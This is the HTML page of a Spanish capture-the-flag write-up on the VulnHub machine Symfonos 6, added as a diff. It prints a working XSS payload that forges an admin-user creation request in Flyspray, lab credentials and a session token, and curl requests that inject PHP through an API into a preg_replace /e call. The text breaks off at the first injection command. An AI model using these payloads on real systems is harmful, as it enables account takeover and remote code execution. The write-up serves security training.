@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Symfonos 6 | Hack Stark ×͜×</title>
+<meta name="keywords" content="">
+<meta name="description" content="Writeup de la máquina Symfonos 6 en VulnHub.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/vulnhub/symfonos6/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/vulnhub/symfonos6/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel='stylesheet' href='/css/custom.css'>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+
+<script src="/js/main.js" defer></script>
+
+<link rel="icon" type="image/png" href="/images/logo.png">
+<link rel="apple-touch-icon" href="/images/logo.png">
+<link rel="shortcut icon" href="/images/logo.png">
+<meta name="theme-color" content="#2E3440">
+
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Hack Stark ×͜× (Alt + H)">Hack Stark ×͜×</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups/" title="WriteUps">
+                    <span>WriteUps</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<div class="post-container">
+  <article class="post-single">
+    <header class="post-header">
+      
+      <h1 class="post-title entry-hint-parent">
+        Symfonos 6
+      </h1>
+      <div class="post-description">
+        Writeup de la máquina Symfonos 6 en VulnHub.
+      </div>
+      <div class="post-meta"><span title='2025-11-03 00:00:00 +0000 UTC'>November 3, 2025</span>&nbsp;·&nbsp;<span>13 min</span>
+
+</div>
+    </header> 
+    <div class="post-content"><h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<p>Vamos a comenzar con un escaneo, con el objetivo de detectar la maquina victima con ayuda de <strong>Arp-Scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I ens33 --localnet --ignoredups
+</span></span></code></pre></div><p><img alt="img1" loading="lazy" src="/img/Pasted%20image%2020250829174529.png"></p>
+<p>Como podemos ver la IP de la maquina es <code>192.168.100.116</code>, ahora con ping vamos a realizar una petición para intentar descubrir que sistema es:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">1</span> 192.168.100.116
+</span></span></code></pre></div><p><img alt="img2" loading="lazy" src="/img/Pasted%20image%2020250829175424.png"></p>
+<p>Como podemos observar tenemos un <code>ttl=64</code> lo que nos indica que es una maquina Linux.</p>
+<p>En este punto vamos a comenzar con el escaneo de puertos con ayuda de <strong>Nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -n -v -Pn 192.168.100.116 -oG allPorts
+</span></span></code></pre></div><p><img alt="img3" loading="lazy" src="/img/Pasted%20image%2020250829175726.png"></p>
+<p>Como podemos observar tenemos los puertos <code>22,80,3000,3306,5000</code> a los cuales les vamos a realizar un escaneo mucho mas exhaustivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,3000,3306,5000 -sCV 192.168.100.116 -oN target
+</span></span></code></pre></div><p><img alt="img4" loading="lazy" src="/img/Pasted%20image%2020250829180032.png"></p>
+<p>Podemos observar mucha información sobre los puerto abiertos así que vamos a analizar la información.</p>
+<p>Vamos a comenzar a analizar todo y podemos comenzar por la web del puerto 80:
+<img alt="img5" loading="lazy" src="/img/Pasted%20image%2020250829180356.png"></p>
+<p><img alt="img6" loading="lazy" src="/img/Pasted%20image%2020250829180409.png">
+Podemos ver que nos dice que no perdamos el tiempo mirando o revisando esta web.</p>
+<p>Vamos a revisar la web que corre por el puerto <code>3000</code>:
+<img alt="img7" loading="lazy" src="/img/Pasted%20image%2020250829180946.png"></p>
+<p>vemos otra web en la cual podemos iniciar sesión pero en si no logramos ver nada mas.</p>
+<p>Revisemos la otra web que esta corriendo el el puerto <code>5000</code> a ver si logramos encontrar algo:</p>
+<p><img alt="img8" loading="lazy" src="/img/Pasted%20image%2020250829181304.png"></p>
+<p>No podemos observar mucho, en este punto vamos a comenzar realizando fuzzing en la web que corre en el puerto <code>80</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.108 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t <span style="color:#ae81ff">20</span>
+</span></span></code></pre></div><p><img alt="img9" loading="lazy" src="/img/Pasted%20image%2020250829210629.png"></p>
+<p>Podemos ver dos directorios, el uso de <code>/posts</code> y el otro de <code>/flyspray</code> donde vamos a analizar los dos:
+<img alt="img10" loading="lazy" src="/img/Pasted%20image%2020250829210804.png">
+Podemos observar dos webs la de <code>/posts</code> no tiene mas que texto y no se puede hacer mucho la verdad pero la de <code>flyspray</code>
+vamos a analizarla para ver que mas podemos encontrar.</p>
+<p>No logro ver nada totalmente grave en la web por lo que voy a registrarme y entrar a ver que logro encontrar:
+<img alt="img11" loading="lazy" src="/img/Pasted%20image%2020250829211702.png"></p>
+<p>ya mi registre y ese es el panel vamos a ver que encontramos dentro del panel para ver si logramos listar o ver algo.</p>
+<p>En realidad no encuentro nada por completo por lo que voy a intentar realizar fuzzing a este recurso para intentar encontrar algo que me sirva para ver versiones o información extra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.108/flyspray -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t <span style="color:#ae81ff">20</span>
+</span></span></code></pre></div><p><img alt="img12" loading="lazy" src="/img/Pasted%20image%2020250829212342.png"></p>
+<p>vemos muchas rutas pero la que primero me lista es la <code>docs</code> puede tener información del servicio así que vamos a revisarla:
+<img alt="img13" loading="lazy" src="/img/Pasted%20image%2020250829212427.png">
+Como podemos observar tenemos muchos documentos de los cuales el de <code>UPGRADING.TXT</code> llama mi atención:
+<img alt="img14" loading="lazy" src="/img/Pasted%20image%2020250829212528.png">
+En la primera línea podemos leer que al parecer el sistema se actualizo de la <code>0.9.9</code> a la <code>1.0</code>, esta información nos sirve mucho ya que con una versión establecida podemos ver si tenemos vulnerabilidades:</p>
+<h1 id="explotación">Explotación<a hidden class="anchor" aria-hidden="true" href="#explotación">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit flyspray
+</span></span></code></pre></div><p><img alt="img15" loading="lazy" src="/img/Pasted%20image%2020250829212748.png"></p>
+<p>podemos ver que si tenemos una vulnerabilidad conocida para la version <code>1.0.1</code> o menor por lo que vamos a ver que nos dice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -x php/webapps/2852.txt
+</span></span></code></pre></div><p><img alt="img16" loading="lazy" src="/img/Pasted%20image%2020250829213209.png">
+Esta vulnerabilidad no aplica pero tenemos otra que se encuentra mas arriba así que vamos a ver de que trata esa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit -x php/webapps/41918.txt
+</span></span></code></pre></div><p><img alt="img17" loading="lazy" src="/img/Pasted%20image%2020250829213443.png"></p>
+<p>Vemos como todo esta extra detallado así que vamos a intentarlo:</p>
+<p>Lo que nos explica es que el parámetro de <code>real_name</code> de un usuario es vulnerable a <strong>Cross-Site Scripting XSS</strong> ya que no esta correctamente configurado, lo que vamos a hacer en este caso primero será configurar directamente una etiqueta script que nos permita enviar una petición a nuestro servidor y ver si algún usuario nos envía una petición:</p>
+<p><img alt="img18" loading="lazy" src="/img/Pasted%20image%2020250829215644.png"></p>
+<p>Creamos la petición y lo vamos a guardar, ahora el punto es que este real name tiene que ser visible para algún usuario, para esto lo que vamos a hacer es enviar un mensaje al chat que tenemos en una de las tareas.</p>
+<p><img alt="img19" loading="lazy" src="/img/Pasted%20image%2020250829215713.png">
+Una vez que enviamos el mensaje se bloque por lo que ahora solo a modo de traza podemos ir al menu y desde nuestra maquina dejar corriendo un servidor en el puerto 80 con python y espera una petición:
+<img alt="img20" loading="lazy" src="/img/Pasted%20image%2020250829215855.png"></p>
+<p>Perfecto si se esta ejecutando correctamente, en este punto lo que ser va a hacer es crear el archivo <code>pwned.js</code> y poner el código que nos proporciona el script ya que lo que va a intentar hacer es crear un usuario como administrador y en si el contenido quedaría de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">tok</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsByName</span>(<span style="color:#e6db74">&#34;csrftoken&#34;</span>)[<span style="color:#ae81ff">0</span>].<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">txt</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;form method=&#34;POST&#34; id=&#34;hacked_form&#34; action = &#34;index.php?do=admin&amp;area=newuser&#34; &gt; &#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;action&#34; value=&#34;admin.newuser&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;do&#34; value=&#34;admin&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;area&#34; value=&#34;newuser&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;user_name&#34; value=&#34;hacker&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;csrftoken&#34; value=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">tok</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;user_pass&#34; value=&#34;12345678&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;user_pass2&#34; value=&#34;12345678&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;real_name&#34; value=&#34;root&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;email_address&#34; value=&#34;root@root.com&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;verify_email_address&#34; value=&#34;  root @root.com&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;jabber_id&#34; value=&#34;&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;notify_type&#34; value=&#34;0&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;time_zone&#34; value=&#34;0&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;input type=&#34;hidden&#34; name=&#34;group_in&#34; value=&#34;1&#34;/&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">txt</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;&lt;/form&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">d1</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;menu&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d1</span>.<span style="color:#a6e22e">insertAdjacentHTML</span>(<span style="color:#e6db74">&#34;afterend&#34;</span>, <span style="color:#a6e22e">txt</span>);
+</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;hacked_form&#34;</span>).<span style="color:#a6e22e">submit</span>();
+</span></span></code></pre></div><p>Vamos a dejar corriendo ya con el archivo nuestro servidor y vemos que es lo que logramos:
+<img alt="img21" loading="lazy" src="/img/Pasted%20image%2020250829220454.png"></p>
+<p>Podemos observar que ya se realizo la petición por lo que vamos a ver si ya tenemos creado el usuario <code>hacker</code> y su contraseña <code>12345678</code>
+<img alt="img22" loading="lazy" src="/img/Pasted%20image%2020250830091029.png"></p>
+<p>vemos que logramos entrar y además que tenemos otra tarea en la lista así que vamos a ver que nos dice esa tarea:
+<img alt="img23" loading="lazy" src="/img/Pasted%20image%2020250830091111.png"></p>
+<p>Vemos que tenemos credenciales las cuales nos dice que es para la web de <code>gitea</code> por lo que vamos a intentar iniciar sesión con las credenciales <code>archilles</code> -&gt; <code>h2sBr9gryBunKdF9</code>, recordemos que tenemos corriendo esa web en el puerto <code>3000</code>:
+<img alt="img24" loading="lazy" src="/img/Pasted%20image%2020250830091858.png"></p>
+<p>Logramos entrar así que podemos comenzar a ver que tenemos en la web.
+Logramos ver algunos repositorios pero uno llama a la primera la atención por el momento y es el de <code>symfonos-blog</code> el cual vamos a analizar ya que puede tener relación con el <code>/posts</code> que encontramos anteriormente:
+<img alt="img25" loading="lazy" src="/img/Pasted%20image%2020250830094930.png"></p>
+<p>tenemos estos archivos pero no tenemos claro si se encuentran o no en <code>/posts</code> por lo que para asegurarnos primero vamos a realizar fuzzing para ver si logramos encontrar algo mas dentro de ese directorio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://192.168.1.108/posts/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span>
+</span></span></code></pre></div><p><img alt="img26" loading="lazy" src="/img/Pasted%20image%2020250830095151.png">
+Vemos que tenemos el directorio <code>includes</code> por lo que vamos aver si podemos obtener información:
+<img alt="img27" loading="lazy" src="/img/Pasted%20image%2020250830095227.png">
+Podemos observar los mismos archivos por lo que efectivamente el proyecto de <code>symfonos-blog</code> es el que esta corriendo en <code>/posts</code> ahora en la web esos archivos no logramos verlos del todo, así que vamos a verlos dentro del proyecto buscando por información o credenciales validas:
+<img alt="img28" loading="lazy" src="/img/Pasted%20image%2020250830095500.png"></p>
+<p>Podemos observar que tenemos ya un usuario y contraseña con lo que podemos intentar conectarnos mediate <code>mysql</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u <span style="color:#e6db74">&#39;root&#39;</span> -D <span style="color:#e6db74">&#39;api&#39;</span> -h 192.168.1.108 -p
+</span></span></code></pre></div><p><img alt="img29" loading="lazy" src="/img/Pasted%20image%2020250830095757.png">
+El error en general nos dice que no puede conectares a la base de datos ya que la IP no esta autorizada.</p>
+<p>Con esto ya descartamos el conectarnos de forma externa. en este punto vamos a revisar el <code>index.php</code> el cual parece ser el encargado de cargar el contenido de <code>/posts</code> :
+<img alt="img30" loading="lazy" src="/img/Pasted%20image%2020250830100015.png">
+Podemos ver que se esta cargando contenido de una fila con nombre <code>text</code> y luego lo imprime por lo que el contenido debe estar almacenado en la base de datos.
+Luego en la línea que estamos encerrando vemos que hace uso de <code>preg_replace()</code> donde primero creamos un regex para indicar por lo que queremos filtrar, luego le pasamos la cadena por la que se va a remplazar y el punto en lo que va a remplazar.</p>
+<p>Lo que es alarmante es el uso del modificador <code>/e</code> ya que este modificador permite que se le inyecte código php por lo que en este punto lo que estamos buscando es alguna forma de modificar lo que se recupera de la base de datos en <code>$content</code> entonces tenemos que tratar de alterar esta información, con todo el código que hemos visto al parecer esta haciendo uso de una api y tenemos otro proyecto de <code>symfonos-api</code> por lo que conviene revisarlo y ver si logramos encontrar alguna cosa que nos permita cambiar la información de la base de datos.</p>
+<p><img alt="img31" loading="lazy" src="/img/Pasted%20image%2020250830101050.png"></p>
+<p>podemos ver toda la información dentro de la carpeta, así que vamos a investigar un poco y a comenzar a unir cabos:
+<img alt="img32" loading="lazy" src="/img/Pasted%20image%2020250830101130.png">
+Vemos que main.go esta intentando conectarse por un puerto que esta en la Variable <code>PORT</code> vamos a ver si encontramos esa variable:
+<img alt="img33" loading="lazy" src="/img/Pasted%20image%2020250830101227.png">
+Se encontraba en un archivo oculto llamado <code>.env</code> y vemos que nos lo dice en el mismo código de <code>main.go</code> que carga de <code>.env</code> las variables.
+Ahora teniendo el puerto lo que tenemos que comenzar a hacer es intentar representar la url con la cual se realizan las peticiones y para lograr encontrarla tenemos que ir investigando dentro de la carpeta api y mirando su contenido:
+<img alt="img34" loading="lazy" src="/img/Pasted%20image%2020250830102036.png">
+Vemos que tenemos una ruta relativa por lo cual vamos a comenzar a armar una url a ver que logramos algo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>culr -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.108/ls2o4g&#34;</span>
+</span></span></code></pre></div><p><img alt="img35" loading="lazy" src="/img/Pasted%20image%2020250830102131.png">
+Vemos que no tenemos respuesta por lo que vamos a continuar viendo ma a dentro ya que tenemos otra carpeta:
+<img alt="img36" loading="lazy" src="/img/Pasted%20image%2020250830102205.png">
+Este es el archivo que se encuentra en la carpeta <code>v1.0</code> y que nos da dos rutas una de <code>/v1.0</code> y luego le concatena la <code>/ping</code> vemos si logramos ver que es lo que hace:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/ping&#34;</span>
+</span></span></code></pre></div><p><img alt="img37" loading="lazy" src="/img/Pasted%20image%2020250830102309.png">
+Vemos que nos responde con un <code>pong</code> y si vemos el código en si ese ping entonces era el como nos iba a responder la web.</p>
+<p>Estamos avanzando mucho pero aun no logramos el objetivo, si nos fijamos tenemos dos carpetas mas en ese directorio:</p>
+<p><img alt="img38" loading="lazy" src="/img/Pasted%20image%2020250830102437.png"></p>
+<p>vemos que tenemos una carpeta <code>auth</code> vamos a ver que podemos encontrar dentro de esta, en este punto vamos a analizarla:</p>
+<p><img alt="img39" loading="lazy" src="/img/Pasted%20image%2020250830103446.png">
+Como podemos observar nos habla primero de una ruta <code>/auth</code> a la por el método GET podemos pasarle <code>/check</code> y tendría que ser correcto.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/auth/check&#34;</span>
+</span></span></code></pre></div><p><img alt="img40" loading="lazy" src="/img/Pasted%20image%2020250830103607.png"></p>
+<p>Ahora tenemos lo mismo por el método post, vamos a intentarlo a ver que conseguimos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X POST <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/auth/login&#34;</span>
+</span></span></code></pre></div><p><img alt="img41" loading="lazy" src="/img/Pasted%20image%2020250830103723.png"></p>
+<p>Vemos que nos da correcto pero esto no nos proporciona nada así que lo que vamos a hacer es analizar el otro archivo que se en encuentra en esta ruta:
+<img alt="img42" loading="lazy" src="/img/Pasted%20image%2020250830105120.png"></p>
+<p>Vemos que en el archivo al parecer se tiene que especificar un <code>username</code> y un <code>password</code> en formato json, así que por lógica creo que tenemos que enviar esos datos por post:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X POST <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/auth/login&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;admin&#34;}&#39;</span>
+</span></span></code></pre></div><p><img alt="img43" loading="lazy" src="/img/Pasted%20image%2020250830121853.png"></p>
+<p>Como podemos observar la petición se tramita pero en si no nos responde por lo que quiero creer que es necesario de credenciales validas , tomando esto en cuenta vamos a ver si con las credenciales de <code>achilles</code> nos responde algo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X POST <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/auth/login&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;username&#34;:&#34;achilles&#34;,&#34;password&#34;:&#34;h2sBr9gryBunKdF9&#34;}&#39;</span> | jq
+</span></span></code></pre></div><p><img alt="img44" loading="lazy" src="/img/Pasted%20image%2020250830122128.png">
+Vemos que logramos obtener su token y su id, esto por ahora no tiene mucho que nos sirva pero puede que mas luego se util por lo que lo guardamos en algún lado.</p>
+<p>Ahora vamos a revisar la otra carpeta la de <code>posts</code> esta también tiene dos archivos donde uno es el siguiente:</p>
+<p><img alt="img45" loading="lazy" src="/img/Pasted%20image%2020250830122936.png">
+Como podemos observar en la ruta <code>/posts</code> vamos a poder realizar diferentes tipos de peticiones por diferentes métodos donde vamos a intentar por practicidad primero el método GET que quiero creer no necesita de datos extra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/posts/&#34;</span> | jq
+</span></span></code></pre></div><p><img alt="img46" loading="lazy" src="/img/Pasted%20image%2020250830123127.png">
+Excelente es el mismo mensaje que tenemos en la web de <code>posts</code>, vamos a intentar el otro método GET a ver que es lo que nos indica:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> curl -s -X GET <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/posts/?id=1&#34;</span> | jq
+</span></span></code></pre></div><p><img alt="img47" loading="lazy" src="/img/Pasted%20image%2020250830123326.png"></p>
+<p>es la misma información indiferentemente del id que le pasemos, ya viendo que la web nos permite realizar peticiones veamos el otro archivo en busca de parámetros o requisitos de datos para los métodos <code>POST,DELETE,PATCH</code> del que en realidad mas me interesa es el <code>PATCH</code> la cual permite actualizar o modificar ciertas partes de los recursos en uso, con esto en cuenta vamos a ver primero el archivo:
+<img alt="img48" loading="lazy" src="/img/Pasted%20image%2020250830123717.png"></p>
+<p>Tenemos esa función en cuenta ya que no dice que tenemos que tramitar data en <code>json</code> con el texto que queremos modificar quiero creer además de que nos piden el <code>id</code> lo que me llama la atención es que no tenemos ningún método con el que podamos definir un usuario y contraseña por lo que me lleva a pensar que o no lo necesita y cualquiera puede cambiar o tenemos que arrastrar un <code>token</code> de session como el que tenemos, vamos a probar primero sin el <code>token</code> y luego ya probamos con el token a ver que obtenemos:
+<img alt="img49" loading="lazy" src="/img/Pasted%20image%2020250830124611.png">
+<img alt="img50" loading="lazy" src="/img/Pasted%20image%2020250830124621.png"></p>
+<p>vemos como se produce la petición pero la web no cambia, en este punto lo que vamos a hacer es arrastrar el <code>token</code> que se produjo con achilles:
+<img alt="img51" loading="lazy" src="/img/Pasted%20image%2020250830124807.png"></p>
+<p>vemos que logramos hacerlos, esto es genial, si revisamos la web:
+<img alt="img52" loading="lazy" src="/img/Pasted%20image%2020250830124829.png">
+Excelente, ahora recordemos que queríamos modificar este texto para aprovecharnos del modificador <code>/e</code> el cual nos permite inyectar comandos en php, y esto lo haremos de la siguiente manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s -X PATCH <span style="color:#e6db74">&#34;http://192.168.1.108:5000/ls2o4g/v1.0/posts/1&#34;</span> -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -b <span style="color:#e6db74">&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTcxMzk1MTAsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.gSVAhsu_qoHdwGq0gOASuoenyB5IyDRj_gNapKJkPqg&#39;</span> -d <span style="color:#e6db74">$&#39;{&#34;text&#34;:&#34;system(\&#39;whoami\&#39;)&#34;}&#39;</span>
